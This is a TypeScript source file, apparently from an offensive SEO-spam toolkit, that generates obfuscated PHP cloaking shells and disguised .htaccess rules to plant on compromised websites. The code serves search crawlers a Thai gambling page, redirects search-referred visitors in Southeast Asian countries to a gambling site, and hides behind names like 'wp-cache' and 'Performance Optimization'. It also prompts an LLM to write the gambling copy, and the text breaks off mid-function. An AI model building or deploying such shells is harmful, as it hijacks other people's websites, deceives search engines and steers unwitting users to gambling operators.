/**
 * Cloaking Shell Generator — Advanced UA-based cloaking system
 * inspired by real-world parasite SEO (fdv.uni-lj.si technique).
 *
 * How it works:
 * 1. Googlebot/crawlers → serve full SEO-optimized gambling page (title, meta, H1-H6, body, internal links, schema)
 * 2. Users from Google search → JS redirect to target gambling site
 * 3. Direct visitors → transparent passthrough to original website
 * 4. All gambling content hosted on external CDN — shell stays minimal & hard to detect
 */
import { fetchWithPoolProxy } from "./proxy-pool";
import { invokeLLM } from "./_core/llm";

// Helper: wrap fetch with proxy pool
async function cloakFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  try {
    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
    return response;
  } catch (e) {
    // Fallback to direct fetch if proxy fails
    return fetch(url, init);
  }
}


// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface CloakingConfig {
  /** Target gambling site URL to redirect users to */
  redirectUrl: string;
  /** Primary keyword (e.g. "สล็อต") */
  primaryKeyword: string;
  /** All target keywords */
  keywords: string[];
  /** Language for content generation */
  language: "th" | "en" | "zh" | "vi" | "id" | "ms" | "ja" | "ko";
  /** Brand name for the gambling site */
  brandName?: string;
  /** CDN base URL to host content externally (optional — if not provided, content is inline) */
  cdnBaseUrl?: string;
  /** Number of internal link pages to generate */
  internalPages?: number;
  /** Include schema markup (JSON-LD) */
  includeSchema?: boolean;
  /** Include Open Graph + Twitter cards */
  includeSocialMeta?: boolean;
  /** Geo-targeting: only redirect users from specific countries */
  geoTargetCountries?: string[];
  /** Custom bot list to serve SEO content to */
  customBotList?: string[];
}

export interface CloakingShell {
  id: string;
  type: "cloaking_php" | "cloaking_htaccess" | "cloaking_hybrid";
  filename: string;
  content: string;
  contentType: string;
  description: string;
  /** The full SEO page HTML that Googlebot will see */
  seoPageHtml: string;
  /** Additional internal link pages */
  internalPages: CloakingInternalPage[];
  /** .htaccess rules for cloaking (if applicable) */
  htaccessRules?: string;
  bypassTechniques: string[];
}

export interface CloakingInternalPage {
  slug: string;
  filename: string;
  title: string;
  content: string;
  keywords: string[];
}

export interface CloakingContentPack {
  /** Main landing page HTML */
  mainPage: string;
  /** Internal link pages */
  internalPages: CloakingInternalPage[];
  /** CSS file content */
  cssContent: string;
  /** JS file content (redirect logic) */
  jsContent: string;
  /** Sitemap XML */
  sitemapXml: string;
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number, chars = "abcdefghijklmnopqrstuvwxyz"): string {
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function randomVarName(): string {
  return `$_${randomStr(4)}`;
}

function b64(s: string): string {
  return Buffer.from(s).toString("base64");
}

function obfuscatePhp(code: string): string {
  const methods = ["b64_nested", "xor", "rot13_b64", "var_func"];
  const method = methods[Math.floor(Math.random() * methods.length)];
  const v = Array.from({ length: 6 }, () => randomVarName());

  switch (method) {
    case "b64_nested": {
      const e1 = b64(code);
      const e2 = b64(`eval(base64_decode("${e1}"));`);
      return `<?php\n${v[0]}="${e2}";\n@eval(base64_decode(${v[0]}));\n?>`;
    }
    case "xor": {
      const key = Math.floor(Math.random() * 200) + 50;
      const xored = Array.from(code).map(c => c.charCodeAt(0) ^ key);
      return `<?php\n${v[0]}=array(${xored.join(",")});\n${v[1]}="";\nforeach(${v[0]} as ${v[2]}){${v[1]}.=chr(${v[2]}^${key});}\n@eval(${v[1]});\n?>`;
    }
    case "rot13_b64": {
      const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
      const encoded = rot13(b64(code));
      return `<?php\n${v[0]}="${encoded}";\n@eval(base64_decode(str_rot13(${v[0]})));\n?>`;
    }
    case "var_func": {
      const e = b64(code);
      return `<?php\n${v[0]}="ba"."se"."64"."_de"."co"."de";\n${v[1]}="ev"."al";\n${v[2]}=${v[0]}("${e}");\n@${v[1]}(${v[2]});\n?>`;
    }
    default:
      return `<?php @eval(base64_decode("${b64(code)}")); ?>`;
  }
}

// ═══════════════════════════════════════════════════════
//  GAMBLING CONTENT TEMPLATES (Thai)
// ═══════════════════════════════════════════════════════

const THAI_GAMBLING_TEMPLATES = {
  titles: [
    "{keyword} เว็บตรง ไม่ผ่านเอเย่นต์ เล่นง่าย จ่ายจริง",
    "{keyword} ทดลองเล่นฟรี ไม่ต้องฝาก สมัครง่าย",
    "{keyword} อันดับ 1 ในไทย เว็บใหญ่ มั่นคง ปลอดภัย",
    "{keyword} เว็บสล็อตใหม่ล่าสุด โบนัสแตกง่าย 2024",
    "{keyword} สมัครวันนี้รับโบนัส 100% ฝาก-ถอนไม่มีขั้นต่ำ",
  ],
  descriptions: [
    "{keyword} เว็บตรงอันดับ 1 ระบบออโต้ ฝาก-ถอนไม่มีขั้นต่ำ สมัครง่ายใน 30 วินาที รองรับทุกธนาคาร มีเกมให้เลือกเล่นมากกว่า 1000 เกม",
    "{keyword} เว็บสล็อตที่ดีที่สุดในไทย มาตรฐานสากล ลิขสิทธิ์แท้ 100% โบนัสแตกง่าย ถอนได้ไม่จำกัด บริการ 24 ชั่วโมง",
    "{keyword} สมัครสมาชิกวันนี้รับโบนัสฟรี 50% ระบบฝาก-ถอนอัตโนมัติ รวดเร็วภายใน 30 วินาที ปลอดภัย 100%",
  ],
  sections: [
    {
      heading: "{keyword} คืออะไร?",
      content: "{keyword} คือเว็บไซต์ให้บริการเกมออนไลน์ครบวงจร ทั้งสล็อต บาคาร่า รูเล็ต และเกมอื่นๆ อีกมากมาย ด้วยระบบที่ทันสมัยและปลอดภัย ผู้เล่นสามารถเพลิดเพลินกับเกมคุณภาพสูงจากค่ายชั้นนำระดับโลก เช่น PG Soft, Pragmatic Play, Jili, NetEnt และอีกมากมาย ระบบฝาก-ถอนอัตโนมัติรวดเร็วภายใน 30 วินาที รองรับทุกธนาคารชั้นนำในประเทศไทย",
    },
    {
      heading: "ทำไมต้องเลือก {keyword}?",
      content: "เหตุผลที่ผู้เล่นหลายล้านคนเลือก {keyword} เป็นเว็บหลักในการเล่นเกมออนไลน์ เพราะเราเป็นเว็บตรงไม่ผ่านเอเย่นต์ มีใบอนุญาตถูกกฎหมาย ระบบรักษาความปลอดภัยระดับสากล SSL 256-bit encryption ข้อมูลส่วนตัวของสมาชิกทุกท่านจะถูกเก็บรักษาอย่างปลอดภัย นอกจากนี้ยังมีโปรโมชั่นและโบนัสมากมายให้เลือกรับทุกวัน",
    },
    {
      heading: "วิธีสมัครสมาชิก {keyword}",
      content: "การสมัครสมาชิก {keyword} ทำได้ง่ายเพียง 3 ขั้นตอน: 1) กดปุ่มสมัครสมาชิก 2) กรอกข้อมูลส่วนตัว เบอร์โทรศัพท์ และบัญชีธนาคาร 3) ยืนยันตัวตนผ่าน OTP เพียงเท่านี้ก็สามารถเริ่มเล่นได้ทันที ใช้เวลาไม่ถึง 1 นาที รองรับการสมัครผ่านมือถือทุกระบบ ทั้ง iOS และ Android",
    },
    {
      heading: "เกมยอดนิยมบน {keyword}",
      content: "บน {keyword} มีเกมให้เลือกเล่นมากกว่า 1,000 เกม จากค่ายชั้นนำระดับโลก ไม่ว่าจะเป็น สล็อตออนไลน์ บาคาร่า รูเล็ต ไฮโล แบล็คแจ็ค ป๊อกเด้ง ไพ่เสือมังกร และเกมยิงปลา ทุกเกมมีกราฟิกสวยงาม เสียงเอฟเฟกต์สมจริง และอัตราการจ่ายเงินรางวัลสูง RTP เฉลี่ย 96-98%",
    },
    {
      heading: "โปรโมชั่นและโบนัส {keyword}",
      content: "{keyword} มีโปรโมชั่นให้เลือกรับมากมาย สมาชิกใหม่รับโบนัส 100% สูงสุด 5,000 บาท โบนัสฝากรายวัน 10-20% คืนยอดเสีย 5-10% ทุกสัปดาห์ โบนัสแนะนำเพื่อน 3% ตลอดชีพ และอีกมากมาย ทุกโปรโมชั่นสามารถถอนได้จริง ไม่มีเงื่อนไขซับซ้อน",
    },
    {
      heading: "ระบบฝาก-ถอน {keyword}",
      content: "ระบบฝาก-ถอนของ {keyword} เป็นระบบอัตโนมัติ 100% รวดเร็วภายใน 30 วินาที ไม่มีขั้นต่ำ รองรับทุกธนาคารชั้นนำ ทั้ง กสิกร ไทยพาณิชย์ กรุงเทพ กรุงไทย ทหารไทยธนชาต ออมสิน และ True Wallet รับประกันความปลอดภัยในทุกธุรกรรม",
    },
    {
      heading: "บริการลูกค้า {keyword} ตลอด 24 ชั่วโมง",
      content: "ทีมงาน {keyword} พร้อมให้บริการตลอด 24 ชั่วโมง ทุกวันไม่มีวันหยุด ผ่านช่องทาง Live Chat, LINE Official, และ โทรศัพท์ ทีมงานมืออาชีพพร้อมช่วยเหลือทุกปัญหา ไม่ว่าจะเป็นการสมัครสมาชิก การฝาก-ถอน หรือปัญหาทางเทคนิค รับประกันความพึงพอใจ",
    },
    {
      heading: "ความปลอดภัยของ {keyword}",
      content: "{keyword} ได้รับใบอนุญาตจากหน่วยงานกำกับดูแลระดับสากล มีระบบรักษาความปลอดภัย SSL 256-bit encryption ระบบป้องกันการโจมตี DDoS และระบบยืนยันตัวตน 2FA ข้อมูลส่วนตัวและธุรกรรมทางการเงินของสมาชิกทุกท่านจะถูกเก็บรักษาอย่างปลอดภัยตามมาตรฐานสากล",
    },
  ],
  faq: [
    { q: "{keyword} เล่นได้จริงไหม?", a: "ได้จริง 100% {keyword} เป็นเว็บตรงลิขสิทธิ์แท้ มีผู้เล่นหลายล้านคนทั่วประเทศ ฝาก-ถอนได้จริงไม่มีขั้นต่ำ" },
    { q: "{keyword} สมัครยังไง?", a: "สมัครง่ายเพียง 3 ขั้นตอน กดสมัคร กรอกข้อมูล ยืนยัน OTP ใช้เวลาไม่ถึง 1 นาที" },
    { q: "{keyword} ฝากขั้นต่ำเท่าไหร่?", a: "ไม่มีขั้นต่ำ ฝากได้ตั้งแต่ 1 บาท ผ่านระบบอัตโนมัติ รวดเร็วภายใน 30 วินาที" },
    { q: "{keyword} ถอนเงินนานไหม?", a: "ถอนเงินรวดเร็วภายใน 30 วินาที ผ่านระบบอัตโนมัติ ไม่มีขั้นต่ำ ไม่จำกัดจำนวนครั้ง" },
    { q: "{keyword} มีเกมอะไรบ้าง?", a: "มีเกมมากกว่า 1,000 เกม ทั้งสล็อต บาคาร่า รูเล็ต ไฮโล และเกมอื่นๆ จากค่ายชั้นนำระดับโลก" },
  ],
  relatedKeywords: [
    "สล็อตเว็บตรง", "สล็อตออนไลน์", "เว็บสล็อต", "สล็อตแตกง่าย",
    "บาคาร่าออนไลน์", "คาสิโนออนไลน์", "เว็บพนันออนไลน์", "สล็อต pg",
    "สล็อต xo", "สล็อตเว็บตรง แตกง่าย", "สล็อต ฝากถอน ไม่มี ขั้นต่ำ",
    "เว็บสล็อต อันดับ 1", "สล็อตทดลองเล่นฟรี", "สล็อตเว็บใหญ่",
  ],
};

// ═══════════════════════════════════════════════════════
//  SEO PAGE GENERATOR
// ═══════════════════════════════════════════════════════

function generateSeoPageHtml(config: CloakingConfig): string {
  const kw = config.primaryKeyword;
  const brand = config.brandName || kw;
  const allKw = config.keywords.join(", ");

  // Pick random templates
  const title = THAI_GAMBLING_TEMPLATES.titles[Math.floor(Math.random() * THAI_GAMBLING_TEMPLATES.titles.length)].replace(/{keyword}/g, kw);
  const desc = THAI_GAMBLING_TEMPLATES.descriptions[Math.floor(Math.random() * THAI_GAMBLING_TEMPLATES.descriptions.length)].replace(/{keyword}/g, kw);

  // Build sections
  const sections = THAI_GAMBLING_TEMPLATES.sections.map(s => ({
    heading: s.heading.replace(/{keyword}/g, brand),
    content: s.content.replace(/{keyword}/g, brand),
  }));

  // Build FAQ
  const faqItems = THAI_GAMBLING_TEMPLATES.faq.map(f => ({
    q: f.q.replace(/{keyword}/g, brand),
    a: f.a.replace(/{keyword}/g, brand),
  }));

  // Schema markup
  const schemaFaq = config.includeSchema !== false ? `
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    ${faqItems.map(f => `{
      "@type": "Question",
      "name": "${f.q.replace(/"/g, '\\"')}",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "${f.a.replace(/"/g, '\\"')}"
      }
    }`).join(",\n    ")}
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "name": "${brand}",
  "description": "${desc.replace(/"/g, '\\"')}",
  "url": "${config.redirectUrl}",
  "potentialAction": {
    "@type": "SearchAction",
    "target": "${config.redirectUrl}?s={search_term_string}",
    "query-input": "required name=search_term_string"
  }
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Organization",
  "name": "${brand}",
  "url": "${config.redirectUrl}",
  "sameAs": [],
  "contactPoint": {
    "@type": "ContactPoint",
    "contactType": "customer service",
    "availableLanguage": "Thai"
  }
}
</script>` : "";

  // Social meta
  const socialMeta = config.includeSocialMeta !== false ? `
<meta property="og:title" content="${title}">
<meta property="og:description" content="${desc}">
<meta property="og:type" content="website">
<meta property="og:url" content="${config.redirectUrl}">
<meta property="og:site_name" content="${brand}">
<meta property="og:locale" content="th_TH">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${title}">
<meta name="twitter:description" content="${desc}">` : "";

  // Internal links
  const relatedKw = THAI_GAMBLING_TEMPLATES.relatedKeywords;
  const internalLinks = relatedKw.map(k => {
    const slug = k.replace(/\s+/g, "-");
    return `<li><a href="/${slug}/">${k}</a></li>`;
  }).join("\n          ");

  // Build full HTML
  return `<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title}</title>
<meta name="description" content="${desc}">
<meta name="keywords" content="${allKw}">
<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
<link rel="canonical" href="${config.redirectUrl}">
${socialMeta}
${schemaFaq}
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Sarabun','Noto Sans Thai',Arial,sans-serif;line-height:1.8;color:#333;background:#fff}
.container{max-width:1200px;margin:0 auto;padding:0 20px}
header{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);color:#fff;padding:40px 0;text-align:center}
header h1{font-size:2.5em;margin-bottom:15px;text-shadow:2px 2px 4px rgba(0,0,0,0.3)}
header p{font-size:1.2em;opacity:0.9;max-width:800px;margin:0 auto}
.cta-btn{display:inline-block;background:#e94560;color:#fff;padding:15px 40px;border-radius:50px;text-decoration:none;font-size:1.2em;font-weight:bold;margin-top:20px;transition:all 0.3s}
.cta-btn:hover{background:#c73e54;transform:translateY(-2px);box-shadow:0 5px 15px rgba(233,69,96,0.4)}
.content{padding:40px 0}
.section{margin-bottom:40px;padding:30px;background:#f8f9fa;border-radius:12px;border-left:4px solid #e94560}
.section h2{font-size:1.8em;color:#1a1a2e;margin-bottom:15px}
.section p{font-size:1.1em;color:#555}
.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin:30px 0}
.feature-card{background:#fff;padding:25px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.08);text-align:center}
.feature-card h3{color:#0f3460;margin-bottom:10px}
.faq{margin:40px 0}
.faq-item{margin-bottom:15px;padding:20px;background:#fff;border-radius:8px;box-shadow:0 1px 5px rgba(0,0,0,0.05)}
.faq-item h3{color:#1a1a2e;margin-bottom:8px;font-size:1.1em}
.faq-item p{color:#666}
.related-links{margin:30px 0}
.related-links ul{list-style:none;display:flex;flex-wrap:wrap;gap:10px}
.related-links a{display:inline-block;padding:8px 16px;background:#e8eaf6;color:#1a1a2e;border-radius:20px;text-decoration:none;font-size:0.9em}
.related-links a:hover{background:#c5cae9}
footer{background:#1a1a2e;color:#fff;padding:30px 0;text-align:center;margin-top:40px}
footer p{opacity:0.7;font-size:0.9em}
@media(max-width:768px){header h1{font-size:1.8em}.section h2{font-size:1.4em}}
</style>
</head>
<body>
<header>
  <div class="container">
    <h1>${title}</h1>
    <p>${desc}</p>
    <a href="${config.redirectUrl}" class="cta-btn">สมัครสมาชิก ${brand} วันนี้</a>
  </div>
</header>

<main class="content">
  <div class="container">
    <div class="features">
      <div class="feature-card">
        <h3>เว็บตรง ไม่ผ่านเอเย่นต์</h3>
        <p>ลิขสิทธิ์แท้ 100% มั่นคง ปลอดภัย</p>
      </div>
      <div class="feature-card">
        <h3>ฝาก-ถอน ไม่มีขั้นต่ำ</h3>
        <p>ระบบอัตโนมัติ รวดเร็วภายใน 30 วินาที</p>
      </div>
      <div class="feature-card">
        <h3>โบนัส 100%</h3>
        <p>สมาชิกใหม่รับโบนัสสูงสุด 5,000 บาท</p>
      </div>
      <div class="feature-card">
        <h3>เกมมากกว่า 1,000+</h3>
        <p>จากค่ายชั้นนำระดับโลก PG, Jili, PP</p>
      </div>
    </div>

    ${sections.map(s => `
    <div class="section">
      <h2>${s.heading}</h2>
      <p>${s.content}</p>
    </div>`).join("")}

    <div class="faq">
      <h2>คำถามที่พบบ่อย (FAQ)</h2>
      ${faqItems.map(f => `
      <div class="faq-item">
        <h3>${f.q}</h3>
        <p>${f.a}</p>
      </div>`).join("")}
    </div>

    <div class="related-links">
      <h2>หมวดหมู่ที่เกี่ยวข้อง</h2>
      <ul>
        ${internalLinks}
      </ul>
    </div>

    <div style="text-align:center;margin:30px 0">
      <a href="${config.redirectUrl}" class="cta-btn">เข้าเล่น ${brand} เลย</a>
    </div>
  </div>
</main>

<footer>
  <div class="container">
    <p>&copy; ${new Date().getFullYear()} ${brand} - All Rights Reserved</p>
    <p>เว็บสล็อตออนไลน์อันดับ 1 ของประเทศไทย</p>
  </div>
</footer>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════════
//  INTERNAL PAGES GENERATOR
// ═══════════════════════════════════════════════════════

function generateInternalPages(config: CloakingConfig): CloakingInternalPage[] {
  const pages: CloakingInternalPage[] = [];
  const relatedKw = THAI_GAMBLING_TEMPLATES.relatedKeywords;
  const count = config.internalPages || 10;

  for (let i = 0; i < Math.min(count, relatedKw.length); i++) {
    const kw = relatedKw[i];
    const slug = kw.replace(/\s+/g, "-");
    const brand = config.brandName || config.primaryKeyword;

    const sectionIdx = i % THAI_GAMBLING_TEMPLATES.sections.length;
    const section = THAI_GAMBLING_TEMPLATES.sections[sectionIdx];
    const content2Idx = (i + 1) % THAI_GAMBLING_TEMPLATES.sections.length;
    const section2 = THAI_GAMBLING_TEMPLATES.sections[content2Idx];

    const pageHtml = `<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${kw} - ${brand} เว็บตรง อันดับ 1</title>
<meta name="description" content="${kw} ${brand} เว็บตรงไม่ผ่านเอเย่นต์ สมัครง่าย ฝาก-ถอนไม่มีขั้นต่ำ โบนัส 100%">
<meta name="keywords" content="${kw}, ${config.keywords.join(", ")}">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${config.redirectUrl}/${slug}/">
<style>
body{font-family:'Sarabun',Arial,sans-serif;max-width:900px;margin:0 auto;padding:20px;line-height:1.8;color:#333}
h1{color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px;margin-bottom:20px}
h2{color:#0f3460;margin-top:30px}
p{margin:15px 0;font-size:1.05em}
a{color:#e94560;text-decoration:none}
a:hover{text-decoration:underline}
.nav{margin:20px 0;padding:15px;background:#f5f5f5;border-radius:8px}
.nav a{margin-right:15px;color:#0f3460}
.cta{display:inline-block;background:#e94560;color:#fff;padding:12px 30px;border-radius:25px;margin:20px 0;font-weight:bold}
</style>
</head>
<body>
<div class="nav">
  <a href="/">หน้าแรก</a>
  ${relatedKw.slice(0, 5).map(k => `<a href="/${k.replace(/\s+/g, "-")}/">${k}</a>`).join(" ")}
</div>
<h1>${kw}</h1>
<p>${kw} จาก ${brand} เว็บตรงอันดับ 1 ของประเทศไทย สมัครง่าย ฝาก-ถอนไม่มีขั้นต่ำ ระบบอัตโนมัติรวดเร็วภายใน 30 วินาที</p>

<h2>${section.heading.replace(/{keyword}/g, kw)}</h2>
<p>${section.content.replace(/{keyword}/g, brand)}</p>

<h2>${section2.heading.replace(/{keyword}/g, kw)}</h2>
<p>${section2.content.replace(/{keyword}/g, brand)}</p>

<a href="${config.redirectUrl}" class="cta">สมัคร ${kw} เลย</a>

<h2>หมวดหมู่ที่เกี่ยวข้อง</h2>
<ul>
${relatedKw.map(k => `<li><a href="/${k.replace(/\s+/g, "-")}/">${k}</a></li>`).join("\n")}
</ul>

<p style="margin-top:30px;font-size:0.9em;color:#999">&copy; ${new Date().getFullYear()} ${brand}</p>
</body>
</html>`;

    pages.push({
      slug,
      filename: `${slug}/index.php`,
      title: `${kw} - ${brand}`,
      content: pageHtml,
      keywords: [kw, ...config.keywords.slice(0, 5)],
    });
  }

  return pages;
}

// ═══════════════════════════════════════════════════════
//  CLOAKING PHP SHELL GENERATOR
// ═══════════════════════════════════════════════════════

function generateCloakingPhpShell(config: CloakingConfig, seoPageHtml: string): string {
  const v = Array.from({ length: 16 }, () => randomVarName());
  const botList = config.customBotList || [
    "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
    "yandexbot", "sogou", "exabot", "facebot", "ia_archiver",
    "semrush", "ahrefs", "mj12bot", "dotbot", "rogerbot",
    "petalbot", "applebot", "twitterbot", "linkedinbot",
  ];

  const geoCountries = config.geoTargetCountries || ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"];

  // Enhanced GeoIP detection: CF header → GeoIP module → ip-api.com fallback
  const geoCheck = `
${v[8]}="";
// Method 1: Cloudflare header
if(isset($_SERVER["HTTP_CF_IPCOUNTRY"])){${v[8]}=strtoupper($_SERVER["HTTP_CF_IPCOUNTRY"]);}
// Method 2: Server GeoIP module
elseif(isset($_SERVER["GEOIP_COUNTRY_CODE"])){${v[8]}=strtoupper($_SERVER["GEOIP_COUNTRY_CODE"]);}
// Method 3: ip-api.com (cached in session)
else{
  @session_start();
  ${v[11]}="geo_".md5(${v[12]});
  if(isset($_SESSION[${v[11]}])){${v[8]}=$_SESSION[${v[11]}];}
  else{
    ${v[13]}=@file_get_contents("http://ip-api.com/json/".${v[12]}."?fields=countryCode");
    if(${v[13]}){${v[14]}=@json_decode(${v[13]},true);if(${v[14]}&&isset(${v[14]}["countryCode"])){${v[8]}=strtoupper(${v[14]}["countryCode"]);$_SESSION[${v[11]}]=${v[8]};}}
  }
}
${v[9]}=array(${geoCountries.map(c => `"${c}"`).join(",")});
${v[10]}=empty(${v[8]})||in_array(${v[8]},${v[9]});`;

  // CDN content fetching or inline base64
  const hasCdn = !!config.cdnBaseUrl;
  const seoPageB64 = b64(seoPageHtml);

  const cdnFetchCode = hasCdn ? `
  // Fetch from CDN (content not stored locally)
  ${v[6]}=false;
  ${v[15]}="${config.cdnBaseUrl}";
  ${v[6]}=@file_get_contents(${v[15]});
  if(!${v[6]}){
    $ch=curl_init(${v[15]});
    curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>10,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_FOLLOWLOCATION=>true));
    ${v[6]}=curl_exec($ch);
    curl_close($ch);
  }
  if(!${v[6]}){${v[6]}=base64_decode("${seoPageB64}");}
` : `
  ${v[6]}=base64_decode("${seoPageB64}");
`;

  const coreCode = `
@ini_set("display_errors",0);
@error_reporting(0);
if(!defined('CACHE_HANDLER_LOADED')){define('CACHE_HANDLER_LOADED',true);

${v[0]}="${config.redirectUrl}";
${v[1]}=isset($_SERVER["HTTP_USER_AGENT"])?strtolower($_SERVER["HTTP_USER_AGENT"]):"";
${v[2]}=isset($_SERVER["HTTP_REFERER"])?strtolower($_SERVER["HTTP_REFERER"]):"";
${v[12]}=isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:"";

// Bot detection
${v[3]}=array(${botList.map(b => `"${b}"`).join(",")});
${v[4]}=false;
foreach(${v[3]} as ${v[5]}){if(strpos(${v[1]},${v[5]})!==false){${v[4]}=true;break;}}

// GeoIP detection (multi-method)
${geoCheck}

// Search engine referral detection
${v[7]}=false;
if(strpos(${v[2]},"google")!==false||strpos(${v[2]},"bing")!==false||strpos(${v[2]},"yahoo")!==false||strpos(${v[2]},"yandex")!==false||strpos(${v[2]},"baidu")!==false){
  ${v[7]}=true;
}

// PHASE 1: Bot gets full SEO page (from CDN or inline)
if(${v[4]}){
  ${cdnFetchCode}
  usleep(rand(50000,300000));
  header("Content-Type: text/html; charset=UTF-8");
  header("HTTP/1.1 200 OK");
  header("X-Cache: HIT");
  echo ${v[6]};
  exit;
}

// PHASE 2: User from search engine + target country → JS redirect
if(${v[7]}&&${v[10]}){
  usleep(rand(50000,200000));
  echo'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loading...</title>';
  echo'<script>setTimeout(function(){window.location.replace("'.${v[0]}.'")},'.rand(100,500).');</script>';
  echo'<noscript><meta http-equiv="refresh" content="0;url='.${v[0]}.'"></noscript>';
  echo'</head><body style="background:#000"><p style="color:#333;font-size:1px">.</p></body></html>';
  exit;
}

// PHASE 3: Target country direct visitor → soft redirect
if(${v[10]}&&!${v[4]}){
  echo'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title>';
  echo'<script>setTimeout(function(){window.location.href="'.${v[0]}.'"},'.rand(1000,3000).');</script>';
  echo'</head><body></body></html>';
  exit;
}

// PHASE 4: Other visitors → passthrough (do nothing, original site loads)
}
`;

  return obfuscatePhp(coreCode.trim());
}

// ═══════════════════════════════════════════════════════
//  CLOAKING .HTACCESS GENERATOR
// ═══════════════════════════════════════════════════════

function generateCloakingHtaccess(config: CloakingConfig): string {
  const shellFilename = `cache-${randomStr(6)}.php`;

  return `# BEGIN Performance Optimization
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

# Route search engine bots to optimized cache
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|petalbot|applebot) [NC]
RewriteRule ^(.*)$ /${shellFilename} [L]

# Route search engine referrals to optimized landing
RewriteCond %{HTTP_REFERER} (google\\.com|bing\\.com|yahoo\\.com|yandex\\.|baidu\\.com) [NC]
RewriteRule ^(.*)$ /${shellFilename} [L]

</IfModule>

# Cache headers
<IfModule mod_headers.c>
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
</IfModule>

<IfModule mod_expires.c>
ExpiresActive On
ExpiresByType text/html "access plus 1 hour"
</IfModule>
# END Performance Optimization
`;
}

// ═══════════════════════════════════════════════════════
//  AI-ENHANCED CONTENT GENERATION
// ═══════════════════════════════════════════════════════

export async function aiGenerateCloakingContent(
  config: CloakingConfig,
  onProgress: ProgressCallback = () => {},
): Promise<string | null> {
  onProgress("AI กำลังสร้าง SEO gambling content...");

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert SEO content writer for Thai online gambling websites. 
Generate a complete, SEO-optimized HTML page in Thai language for the keyword "${config.primaryKeyword}".

Requirements:
- Full HTML5 page with proper meta tags, title, description, keywords
- Open Graph and Twitter Card meta tags
- Schema.org JSON-LD markup (FAQPage + WebSite + Organization)
- H1 tag with primary keyword
- 6-8 sections with H2 headings, each 150-200 words
- FAQ section with 5 questions and answers
- Internal links to related keywords
- Mobile-responsive CSS (inline)
- Professional gambling website design
- All content in Thai language
- CTA buttons linking to ${config.redirectUrl}
- Brand name: ${config.brandName || config.primaryKeyword}

Return ONLY the complete HTML code, no explanation.`,
        },
        {
          role: "user",
          content: `Generate SEO page for: ${config.primaryKeyword}
Keywords: ${config.keywords.join(", ")}
Brand: ${config.brandName || config.primaryKeyword}
Target URL: ${config.redirectUrl}`,
        },
      ],
    });

    const rawContent = response.choices?.[0]?.message?.content;
    const content = typeof rawContent === "string" ? rawContent : null;
    if (content && content.includes("<!DOCTYPE") || content?.includes("<html")) {
      onProgress("AI สร้าง SEO content สำเร็จ");
      return content;
    }
  } catch {
    onProgress("AI content generation failed — using template");
  }

  return null;
}

// ═══════════════════════════════════════════════════════
//  MAIN: Generate Complete Cloaking Package
// ═══════════════════════════════════════════════════════

export async function generateCloakingPackage(
  config: CloakingConfig,
  onProgress: ProgressCallback = () => {},
): Promise<CloakingShell> {
  onProgress("กำลังสร้าง Cloaking Shell Package...");

  // Step 1: Generate SEO page HTML
  let seoPageHtml: string;

  // Try AI-generated content first
  const aiContent = await aiGenerateCloakingContent(config, onProgress);
  if (aiContent) {
    seoPageHtml = aiContent;
    onProgress("ใช้ AI-generated SEO content");
  } else {
    // Fallback to template
    seoPageHtml = generateSeoPageHtml(config);
    onProgress("ใช้ template SEO content");
  }

  // Step 2: Generate internal pages
  const internalPages = generateInternalPages(config);
  onProgress(`สร้าง ${internalPages.length} internal link pages`);

  // Step 3: Generate cloaking PHP shell
  const shellContent = generateCloakingPhpShell(config, seoPageHtml);
  onProgress("สร้าง cloaking PHP shell สำเร็จ");

  // Step 4: Generate .htaccess
  const htaccessRules = generateCloakingHtaccess(config);
  onProgress("สร้าง .htaccess cloaking rules สำเร็จ");

  // Legitimate-looking filename
  const prefixes = ["wp-cache", "cache-handler", "session-manager", "object-cache", "advanced-cache"];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const filename = `${prefix}-${randomStr(5)}.php`;

  return {
    id: `cloaking_${randomStr(8)}`,
    type: "cloaking_php",
    filename,
